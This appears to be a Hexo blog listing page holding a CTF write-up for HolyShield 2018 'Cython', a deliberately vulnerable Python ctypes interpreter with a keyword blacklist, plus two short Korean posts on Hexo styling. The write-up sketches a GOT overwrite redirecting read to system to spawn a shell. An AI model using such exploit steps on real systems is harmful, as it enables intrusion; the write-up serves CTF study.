<!DOCTYPE html>
<html lang="zh-cmn-Hans">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>KiraSys</title>
  
  
  <!--link rel="stylesheet" href="//cdn.jsdelivr.net/highlight.js/9.10.0/styles/github-gist.min.css"-->
  <link rel="stylesheet" href="//cdn.jsdelivr.net/highlight.js/9.10.0/styles/github-gist.min.css">
  <link rel="stylesheet" href="/css/style.css">
</head>

<body>
<div class="Shell">
    <aside class='SideBar'>
    <section class='avatar' style="background-image: url(/assets/header.png)">
        <div class='av-pic' style="background-image: url(/assets/logo.jpg)">
        </div>
    </section>
    <section class='menu'>
        <div>KiraSys</div>
        
            <div>CAT-Security</div>
        
        <ul>
          
            <a href="/" class="Btn">
              <li>Home</li>
            </a>  
          
            <a href="/archives/" class="Btn">
              <li>Archive</li>
            </a>  
          
            <a href="/categories/" class="Btn">
              <li>Categories</li>
            </a>  
          
        </ul>
    </section>
    <section class="media">
        
            
                <a href="https://github.com/kirasys">
                    <img src="/assets/github.svg" />
                </a>
            
        
            
                <a href="https://www.facebook.com/profile.php?id=100008635065103">
                    <img src="/assets/facebook.svg" />
                </a>
            
        
    </section>
</aside>

    <div class="container">
        <div data-pager-shell>
            <ul class="Index">
  
    <header class='PageTitle'>
        <h1>{ Etc }</h1>
    </header>
  
  
    <li>
      <article class='ListView'>
    <header class="title">
      
        <h1>
          <a href="/2018/02/11/HolyShield-2018-Cython/">HolyShield 2018 - Cython</a>
        </h1>
      
      <div class='ListMeta'>
  <time datetime="2018-02-11T11:46:12.000Z" itemprop="datePublished">
    2018-02-11
  </time>
  
  
  / 
  <ul>
    
  <li class="meta-text">
  { <a href="/categories/etc/">Etc</a> }
  </li>


  </ul>
  
</div>

    </header>
    <div>
      
        <h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote>
<p>we are developing c language interpreter, can you find the vulnerability for me?</p>
</blockquote>
<p><br></p>
<h3 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ /usr/bin/python2.7 cython.py 2&gt;1</span><br></pre></td></tr></table></figure>
<p>No additional modules are needed<br><br></p>
<h3 id="How-to-exploit"><a href="#How-to-exploit" class="headerlink" title="How to exploit"></a>How to exploit</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m1 = malloc(<span class="number">100</span>);</span><br><span class="line">read(0,m1,100) 			   -&gt; input '/bin/sh;'</span><br><span class="line">read(0,&amp;(python2.7 read@got),4); -&gt; input system@plt</span><br><span class="line">read(m1,<span class="number">1</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<p><br></p>
<h3 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> exit</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">blacklist = [<span class="string">'system'</span>,<span class="string">'exec'</span>,<span class="string">'open'</span>,<span class="string">'printf'</span>,<span class="string">'put'</span>,<span class="string">'write'</span>,<span class="string">'_'</span>, <span class="string">'&#123;'</span>, <span class="string">'\\'</span>]</span><br><span class="line">vars = &#123;&#125;</span><br><span class="line">CNT  = <span class="number">10</span></span><br><span class="line">lib  = cdll.LoadLibrary(<span class="string">'libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cython</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">Qualifying</span><span class="params">(self)</span>:</span></span><br><span class="line">		hend = <span class="string">''</span>.join(<span class="string">'&#123;:02x&#125;'</span>.format(randrange(<span class="number">0</span>,<span class="number">0x100</span>)) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">4</span>))</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"Before the service, I'll check if you're eligible"</span></span><br><span class="line">		<span class="keyword">print</span> <span class="string">"sha256(x).hexdigiest() == '&#123;0&#125;....'"</span>.format(hend)</span><br><span class="line">		x = raw_input(<span class="string">"x : "</span>)</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">not</span> sha256(x).hexdigest().startswith(hend):</span><br><span class="line">			self.Error(<span class="string">"You're not eligible for the service"</span>)</span><br><span class="line">			exit(<span class="number">-1</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">Error</span><span class="params">(self,msg)</span>:</span></span><br><span class="line">		<span class="keyword">print</span> <span class="string">"Error: "</span>+msg</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">(self)</span>:</span></span><br><span class="line">		<span class="comment">#self.Qualifying()</span></span><br><span class="line">		<span class="keyword">print</span> <span class="string">"Cython 2.7.12 (default, Feb 21 2018, 02:37:52)"</span></span><br><span class="line">		<span class="keyword">print</span> <span class="string">"[GCC 5.4.0 20160609] on linux2"</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">print</span> <span class="string">"int main()&#123;"</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> xrange(CNT):</span><br><span class="line">			command = raw_input(<span class="string">'\t'</span>)</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> command.endswith(<span class="string">'&#125;'</span>):</span><br><span class="line">				exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> <span class="keyword">not</span> command.endswith(<span class="string">';'</span>):</span><br><span class="line">				self.Error(<span class="string">"Can't not found semicolon"</span>)</span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">			</span><br><span class="line">			self.interpreter(command[:<span class="number">-1</span>])</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"&#125;"</span></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">interpreter</span><span class="params">(self,command)</span>:</span></span><br><span class="line">		<span class="keyword">if</span> command == <span class="string">''</span>:</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> len(command)&gt;<span class="number">100</span>:</span><br><span class="line">			self.Error(<span class="string">'Too long'</span>)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> b <span class="keyword">in</span> blacklist:</span><br><span class="line">			<span class="keyword">if</span> b <span class="keyword">in</span> command:</span><br><span class="line">				self.Error(<span class="string">'Hack detected'</span>)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">		</span><br><span class="line">		<span class="comment"># assign string (escape sequence not supported)</span></span><br><span class="line">		<span class="keyword">if</span> command.count(<span class="string">'"'</span>)%<span class="number">2</span> <span class="keyword">or</span> command.count(<span class="string">'\''</span>)%<span class="number">2</span>:</span><br><span class="line">			self.Error(<span class="string">'Misused string'</span>)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">			sq , dq = command.rfind(<span class="string">'\''</span>), command.rfind(<span class="string">'"'</span>)</span><br><span class="line">			<span class="keyword">if</span> sq&gt;dq:</span><br><span class="line">				p = command[:sq]</span><br><span class="line">				string = command[p.rfind(<span class="string">'\''</span>): sq+<span class="number">1</span>]</span><br><span class="line">			<span class="keyword">elif</span> sq&lt;dq:</span><br><span class="line">				p = command[:dq]</span><br><span class="line">				string = command[p.rfind(<span class="string">'"'</span>): dq+<span class="number">1</span>]</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">if</span> sq == dq:</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">			command = command.replace(string,str(lib.strdup(string[<span class="number">1</span>:<span class="number">-1</span>])))</span><br><span class="line">		</span><br><span class="line">		<span class="string">"""</span></span><br><span class="line"><span class="string">		# indexing</span></span><br><span class="line"><span class="string">		if command.count('[')%2 or command.count(']')%2:</span></span><br><span class="line"><span class="string">			self.Error('Misused index operator')</span></span><br><span class="line"><span class="string">			return</span></span><br><span class="line"><span class="string">		"""</span></span><br><span class="line"></span><br><span class="line">		<span class="comment"># resolve function</span></span><br><span class="line">		p = re.compile(<span class="string">'(\w+)\('</span>)</span><br><span class="line">		func_list = set(p.findall(command))</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> func <span class="keyword">in</span> func_list:</span><br><span class="line">			<span class="keyword">try</span>:</span><br><span class="line">				vars[func] = lib[func]</span><br><span class="line">			<span class="keyword">except</span> AttributeError <span class="keyword">as</span> e:</span><br><span class="line">				self.Error(e.message)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">		<span class="comment"># assign variables (multiple assignment not supported)</span></span><br><span class="line">		p = re.compile(<span class="string">'([a-zA-Z]+\w*)\s*=\s*(.*)'</span>)</span><br><span class="line">		assign = p.match(command)</span><br><span class="line"></span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			<span class="keyword">if</span> assign:</span><br><span class="line">				name = assign.group(<span class="number">1</span>)</span><br><span class="line">				value = re.sub(<span class="string">'([a-zA-Z]+)'</span>,<span class="string">"vars['\g&lt;1&gt;']"</span>,assign.group(<span class="number">2</span>))</span><br><span class="line">				vars[name] = eval(value)</span><br><span class="line">			<span class="keyword">else</span>:		  </span><br><span class="line">				command = re.sub(<span class="string">'([a-zA-Z]+)'</span>,<span class="string">"vars['\g&lt;1&gt;']"</span>,command)</span><br><span class="line">				eval(command)</span><br><span class="line">		<span class="keyword">except</span>:</span><br><span class="line">			self.Error(<span class="string">'SyntaxError'</span>)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	i = Cython()</span><br><span class="line">	i.start()</span><br></pre></td></tr></table></figure>
      
    </div>
</article>

    </li>
  
    <li>
      <article class='ListView'>
    <header class="title">
      
        <h1>
          <a href="/2018/01/12/Customize-hexo-theme-css/">Customize hexo theme css</a>
        </h1>
      
      <div class='ListMeta'>
  <time datetime="2018-01-12T02:40:02.000Z" itemprop="datePublished">
    2018-01-12
  </time>
  
  
  / 
  <ul>
    
  <li class="meta-text">
  { <a href="/categories/etc/">Etc</a> }
  </li>


  </ul>
  
</div>

    </header>
    <div>
      
        <p>hexo icalm 테마에서 codeblock의 배경 색깔을 바꾸기 위해 style.css를 변경하는 방법을 찾아보았다. theme_name/source/css/_partial 폴더로 가면 styl 파일들이 여러개 있고, 그 중에 내가 바꾸고 싶은 부분을 처리해주는 부분을 찾아야한다. 나같은 경우는 codeblock css를 바꾸고 싶었기 때문에 code 클래스의 css를 변경해야 했다. <br><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//layout.styl</span><br><span class="line">figure.highlight, .code, code</span><br><span class="line">    font-family: Monaco, Menlo, Consolas, &apos;Microsoft Yahei&apos;, monospace</span><br><span class="line">    background-color: #f6f8fa</span><br><span class="line">    font-size: 13px</span><br><span class="line">    margin: auto 5px</span><br><span class="line">    pre</span><br><span class="line">        // width: 90%</span><br><span class="line">        margin: auto</span><br><span class="line">        overflow-x: auto</span><br><span class="line">        font-family: inherit</span><br><span class="line">        font-size: 13px</span><br><span class="line">        line-height: 1.6em</span><br></pre></td></tr></table></figure></p>
<p>.code에 background-color를 추가해주었더니 배경색깔이 바뀌었다.</p>

      
    </div>
</article>

    </li>
  
    <li>
      <article class='ListView'>
    <header class="title">
      
        <h1>
          <a href="/2018/01/12/How-to-disable-hexo-codeblock-line-number/">Disable line number of hexo codeblock</a>
        </h1>
      
      <div class='ListMeta'>
  <time datetime="2018-01-12T02:39:11.000Z" itemprop="datePublished">
    2018-01-12
  </time>
  
  
  / 
  <ul>
    
  <li class="meta-text">
  { <a href="/categories/etc/">Etc</a> }
  </li>


  </ul>
  
</div>

    </header>
    <div>
      
        <p>hexo를 사용하여 만든 post에서 codeblock에 기본적으로 line number가 적혀있다. line number가 있는게 이상해서 없애려고 했는데 구글링해봐도 잘나오지 않아 직접 찾아서 고쳤다. codeblock 부분의 html 소스를 보면 line number는 “gutter”라는 클래스에 포함되고 code는 “code” 클래스에 포함된다. gutter 클래스를 생성해주는 부분을 찾아보면 myblog/node_modules/hexo-util/lib/highlight.js에 있는 걸 확인할 수 있다.<br><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//highlight.js</span><br><span class="line">  result += &apos;&lt;table&gt;&lt;tr&gt;&apos;;</span><br><span class="line">/*</span><br><span class="line">  if (gutter) &#123;</span><br><span class="line">    result += &apos;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&apos; + numbers + &apos;&lt;/pre&gt;&lt;/td&gt;&apos;;</span><br><span class="line">  &#125;</span><br><span class="line">*/</span><br><span class="line">  result += &apos;&lt;td class=&quot;code&quot;&gt;&apos; + before + content + after + &apos;&lt;/td&gt;&apos;;</span><br><span class="line">  result += &apos;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&apos;;</span><br></pre></td></tr></table></figure></p>
<p>gutter를 생성하는 부분의 코드를 주석 처리하고 변경된 모듈은 적용시켜 주면 된다.<br><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\user\Desktop&gt;npm install hexo-util --save</span><br><span class="line">npm WARN saveError ENOENT: no such file or directory, open <span class="string">'C:\Users\user\package.json'</span></span><br><span class="line">npm notice created a lockfile as package-lock.json. You should commit this file.</span><br><span class="line">npm WARN enoent ENOENT: no such file or directory, open <span class="string">'C:\Users\user\package.json'</span></span><br><span class="line">npm WARN user No description</span><br><span class="line">npm WARN user No repository field.</span><br><span class="line">npm WARN user No README data</span><br><span class="line">npm WARN user No license field.</span><br><span class="line">npm WARN optional SKIPPING OPTIONAL DEPENDENCY: fsevents@1.1.3 (node_modules\fsevents):</span><br><span class="line">npm WARN notsup SKIPPING OPTIONAL DEPENDENCY: Unsupported platform <span class="keyword">for</span> fsevents@1.1.3: wan</span><br><span class="line">t: &#123;<span class="string">"os"</span>:<span class="string">"win32"</span>,<span class="string">"arch"</span>:<span class="string">"x64"</span>&#125;)</span><br><span class="line"></span><br><span class="line">+ hexo-util@0.6.3</span><br><span class="line">added 116 packages and updated 1 package <span class="keyword">in</span> 13.541s</span><br></pre></td></tr></table></figure></p>
<p>생각보다 간단해보이지만 찾는데 시간이 꽤 걸렸다…</p>

      
    </div>
</article>

    </li>
  
</ul>


            <footer>
    <div>© 2016 - kirasys </div>
    <div>
    Powered by Hexo
    </div>
</footer>

        </div>
    </div>
</div>
<script src="/js/pager/dist/singlepager.js"></script>
<script>
var sp = new Pager('data-pager-shell')

</script>
</body>
</html>